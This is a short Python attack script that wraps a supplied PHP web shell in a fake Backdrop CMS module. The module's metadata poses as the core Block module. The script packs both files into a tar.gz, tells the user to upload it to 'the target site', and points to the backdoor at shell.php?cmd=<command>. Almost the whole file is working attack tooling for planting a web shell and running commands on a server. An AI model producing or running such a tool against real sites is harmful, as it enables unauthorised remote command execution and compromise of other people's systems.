#!/usr/bin/env python3
import os 
import sys
import tarfile

def create_files(module_name, shell_file_path):
    """Create the necessary files for the module."""
    os.makedirs(module_name, exist_ok=True)

    info_content = f"""type = module
name = Block
description = Doberman
package = Layouts
tags = Blocks
tags = Site Architecture
version = BACKDROP_VERSION
backdrop = 1.x
configure = admin/structure/block
project = backdrop
version = 1.27.1
timestamp = 20231010
"""
    info_path = os.path.join(module_name, f"{module_name}.info")
    with open(info_path, 'w') as f:
        f.write(info_content)

    shell = "shell.php"  # Define the path to the shell file
    
    php_path = os.path.join(module_name, "shell.php")
    with open(shell_file_path, 'r') as src:
        shell_content = src.read()
    with open(php_path, 'w') as dest:
        dest.write(shell_content)
    print(f"Created {php_path} with shell content.")
    return info_path, php_path

def create_tar(module_name, php_path, info_path):
    tar_path = f"{module_name}.tar.gz"
    with tarfile.open(tar_path, "w:gz") as tar:
        tar.add(info_path, arcname=f"{module_name}/{module_name}.info")
        tar.add(php_path, arcname=f"{module_name}/shell.php")
    print(f"Created tar.gz file: {tar_path}")
    return tar_path

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 Doberman.py <path_to_shell.php>")
        sys.exit(1)

    shell_file_path = sys.argv[1]
    module_name = "doberman"
    info_path, php_path = create_files(module_name, shell_file_path)
    tar_path = create_tar(module_name, php_path, info_path)

    print(f"Created zip file: {tar_path}")
    print(f"Upload {tar_path} to the target site.")
    print(f"After enabling the module, access the backdoor at: <target>/{module_name}/shell.php?cmd=<command>")

if __name__ == "__main__":
    main()